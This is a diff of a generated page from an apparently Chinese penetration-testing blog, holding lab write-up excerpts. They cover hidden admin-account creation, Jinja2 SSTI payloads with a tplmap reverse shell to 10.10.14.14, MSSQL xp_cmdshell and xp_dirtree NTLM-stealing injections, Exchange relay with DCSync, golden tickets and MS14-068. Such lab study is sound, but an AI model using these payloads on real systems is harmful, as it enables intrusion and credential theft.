@@ -118,6 +118,158 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/" class="title">调用API绕过杀软添加用户</a>
+    <section class="desc">
+  创建隐藏账户：
+net user tw$ password /add  ###用户名为tw，密码为password的
+也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
+通过组查看：
+net localgroup administrators 
+net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
+一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
+实现：
+微软提供C++实现原型：
+#ifndef UNICODE
+#define UNICODE
+#endif
+#pragma comment(lib, &quot;netapi32.lib&quot;)
+
+#include &lt;stdio.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;windows.h&gt; 
+#include &lt;lm.h&gt;
+
+int wmain(int argc, wchar_t *argv[])
+{
+   LPGROUP_USERS_INFO_0 pBuf = NULL;
+   DWORD dwLevel = 0;
+   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
+   DWORD dwEntriesRead = 0;
+   DWORD dwTotalEntries = 0;
+   NET_API_STATUS nStatus;
+
+   if (argc != 3)
+   {
+  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
+  exit(1);
+   }
+
+   nStatus = NetUserGetGroups(argv[1],
+  argv[2],
+  dwLevel,
+  (LPBYTE*)&amp;pBuf,
+  dwPrefMaxLen,
+  &amp;dwEntriesRead,
+  &amp;dwTotalEntries);
+
+   if (nStatus == NERR_Success)
+   {
+  LPGROUP_USERS_INFO_0 pTmpBuf;
+  DWORD i;
+  DWORD dwTotalCount = 0;
+
+  if ((pTmpBuf = pBuf) != NULL)
+  {
+ fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);
+
+ for (i = 0; i &lt; dwEntriesRead; i++)
+ {
+assert(pTmpBuf != NULL);
+
+if (pTmpBuf == NULL)
+{
+   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
+   break;
+}
+
+wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);
+
+pTmpBuf++;
+dwTotalCount++;
+ }
+  }
+
+  if (dwEntriesRead &lt; dwTotalEntries)
+ fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);
+
+  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
+   }
+   else
+  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);
+
+   if (pBuf != NULL)
+  NetApiBufferFree(pBuf);
+
+   return 0;
+}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
+我用C实现效果如下：
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="title">SSTI[服务器模板注入]</a>
+    <section class="desc">
+  漏洞成因：
+用户输入未经过滤就交给引擎处理
+将python语句编译成一句话： 
+不同类型SSTI paylaod: 
+SSTI模板注入常见引擎：
+
+判断是哪种类型SSTI
+
+一个实例：
+nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知
+
+检测SSTI
+
+name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
+确定是jinja之后，尝试文件读取和命令执行
+读取文件
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+命令执行：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
+python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/26/MSSQL-NTLM-stealer/" class="title">MSSQL NTLM stealer</a>
+    <section class="desc">
+  可窃取NTLM的漏洞及利用方式
+利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
+如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
+环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
+漏洞利用
+默认情况ASP/MSSQL支持堆叠注入：
+常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
+https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
+猜测是没有权限的问题，想到xp_dirtree外带数据：
+payload：
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/" class="title">mimikatz抓取密码小记</a>
     <section class="desc">
   1、直接抓取本机：
@@ -376,206 +528,6 @@ https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/" class="title">域控提权之Exchange提权</a>
-    <section class="desc">
-  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
-也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
-漏洞利用：net group 查看用户组
-
-或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
-添加用户tw：
-$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
-New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
-net group &quot;Exchange Windows Permissions&quot; tw /add 
-或
-Import-Module ActiveDirectory
-Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
-net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
-sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
-python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
-
-连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
-impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
-进一步学习：在Linux上使用KRBTGT hash实现金票攻击
-在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
-首先获取domain sid ：
-Get-ADDomain htb.local
-S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
-python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
-export KRB5CCNAME=UserDoesnotExit.ccache
-使用TGT使用下列任意方式远程执行命令
-python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
-python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
-python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
-
-python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/" class="title">域控提权之ms14-068</a>
-    <section class="desc">
-  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
-一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
-什么是PAC（特权帐户证书）：
-PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
-二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
-2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
-./FindSMB2UPTime.py 192.168.31.220
-DC is up since: 2013-12-28 22:24:25
-This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
-# This is an example script only.
-import-module activedirectory
-[string]$KBNumber = &quot;KB3011780&quot;
-$DomainControllers = Get-ADDomainController -filter *
-[int]$DomainControllersCount = $DomainControllers.Count
-[int]$PatchedDCCount = 0
-[int]$UnPatchedDCCount = 0
-$UnpatchedDCs = @()
-Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
-ForEach ($DomainController in $DomainControllers)
-{
-    $DomainControllerHostName = $DomainController.HostName
-    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue
-
-    IF ($PatchStatus.InstalledOn)
-        {
-            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
-            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
-            $PatchedDCCount++
-        }
-    Else
-        {
-            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
-            [array]$UnpatchedDCs += $DomainController.HostName
-            $UnPatchedDCCount++
-        }
-}
-Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
-IF ($UnpatchedDCs)
-{
-    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
-    $UnpatchedDCs
-}环境描述：
-目标机器：10.10.10.52  Windows Server 2008 R2 Standard
-已获取：DC上的一个普通本地账户
-
-james用户账户密码
-
-
-james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）
-
-攻击机：kali 10.10.14.14  （不在域中）
-在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
-sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
-10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
-[libdefaults]
-    default_realm = HTB.LOCAL
-
-[realms]
-   HTB.LOCAL = {
-    kdc = mantis.htb.local:88
-    admin_server = mantis.htb.local
-    default_domain = HTB.LOCAL
-    }
-[domain_realm]
-    .domain.internal = HTB.LOCAL
-    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
-nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）
-
-[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间
-
-[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间
-
-
-6.为james用户生成一张新的Kerberos票证
-kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
-klist
-此时生成的是jame是的票证：访问C$是没有权限的
-kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
-tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证
-
-8.替换低权限票证
-mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$
-
-Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
-ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
-mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
-net use \\htb.local\admin$    ####使用IP可能会失败
-dir \\htb.local\c$ 
-psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
-GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）
-
-
-
-</section>
-    <p class="sub">Apr 25, 2020</p>
-  </div>
-</div>-->
-<!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" class="title">Kerberos认证学习</a>
-    <section class="desc">
-  Kerberos简介：
-
-Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
-
-几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
-
-Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
-
-
-
-
-1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
-2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
-AS向Clinet发送两条消息：        
-消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
-步骤1中用户提供的信息+TGS SESSION KEY                
-消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
-TGS名称/ID            
-时间戳            
-TGS SESSION KEY
-TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
-3、TGS-REQ(金票攻击发生在此步骤)
-Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
-你的名称/ID
-时间戳`消息2：[未加密消息]
-所要请求服务的名称/ID
-服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
-4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
-步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
-步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
-检查TGT是否过期
-检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
-消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
-消息2：[TGS Session Key加密]    
-服务名称/ID   
-时间戳    
-票据生存期    
-Service Session Key5、AP-REQ银票攻击发生在此步骤
-Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
-用户名称/ID
-时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
-6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
-
-
-</section>
-    <p class="sub">Apr 25, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -589,6 +541,203 @@ Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SES
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 调用API绕过杀软添加用户 &gt;</div>
+                            <div class="content flex1">
+                                
+  创建隐藏账户：
+net user tw$ password /add  ###用户名为tw，密码为password的
+也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
+通过组查看：
+net localgroup administrators 
+net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
+一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
+实现：
+微软提供C++实现原型：
+#ifndef UNICODE
+#define UNICODE
+#endif
+#pragma comment(lib, &quot;netapi32.lib&quot;)
+
+#include &lt;stdio.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;windows.h&gt; 
+#include &lt;lm.h&gt;
+
+int wmain(int argc, wchar_t *argv[])
+{
+   LPGROUP_USERS_INFO_0 pBuf = NULL;
+   DWORD dwLevel = 0;
+   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
+   DWORD dwEntriesRead = 0;
+   DWORD dwTotalEntries = 0;
+   NET_API_STATUS nStatus;
+
+   if (argc != 3)
+   {
+  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
+  exit(1);
+   }
+
+   nStatus = NetUserGetGroups(argv[1],
+  argv[2],
+  dwLevel,
+  (LPBYTE*)&amp;pBuf,
+  dwPrefMaxLen,
+  &amp;dwEntriesRead,
+  &amp;dwTotalEntries);
+
+   if (nStatus == NERR_Success)
+   {
+  LPGROUP_USERS_INFO_0 pTmpBuf;
+  DWORD i;
+  DWORD dwTotalCount = 0;
+
+  if ((pTmpBuf = pBuf) != NULL)
+  {
+ fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);
+
+ for (i = 0; i &lt; dwEntriesRead; i++)
+ {
+assert(pTmpBuf != NULL);
+
+if (pTmpBuf == NULL)
+{
+   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
+   break;
+}
+
+wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);
+
+pTmpBuf++;
+dwTotalCount++;
+ }
+  }
+
+  if (dwEntriesRead &lt; dwTotalEntries)
+ fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);
+
+  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
+   }
+   else
+  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);
+
+   if (pBuf != NULL)
+  NetApiBufferFree(pBuf);
+
+   return 0;
+}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
+我用C实现效果如下：
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]" href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; SSTI[服务器模板注入] &gt;</div>
+                            <div class="content flex1">
+                                
+  漏洞成因：
+用户输入未经过滤就交给引擎处理
+将python语句编译成一句话： 
+不同类型SSTI paylaod: 
+SSTI模板注入常见引擎：
+
+判断是哪种类型SSTI
+
+一个实例：
+nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知
+
+检测SSTI
+
+name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
+确定是jinja之后，尝试文件读取和命令执行
+读取文件
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+命令执行：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
+python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer" href="/2020/04/26/MSSQL-NTLM-stealer/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; MSSQL NTLM stealer &gt;</div>
+                            <div class="content flex1">
+                                
+  可窃取NTLM的漏洞及利用方式
+利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
+如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
+环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
+漏洞利用
+默认情况ASP/MSSQL支持堆叠注入：
+常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
+https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
+猜测是没有权限的问题，想到xp_dirtree外带数据：
+payload：
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
                        class="post-item swiper-slide flex flex-v">
@@ -952,251 +1101,6 @@ https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
                                 <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                 <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                 <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域控提权之Exchange提权" alt="域控提权之Exchange提权" href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域控提权之Exchange提权" alt="域控提权之Exchange提权"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域控提权之Exchange提权 &gt;</div>
-                            <div class="content flex1">
-                                
-  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
-也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
-漏洞利用：net group 查看用户组
-
-或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
-添加用户tw：
-$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
-New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
-net group &quot;Exchange Windows Permissions&quot; tw /add 
-或
-Import-Module ActiveDirectory
-Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
-net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
-sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
-python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
-
-连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
-impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
-进一步学习：在Linux上使用KRBTGT hash实现金票攻击
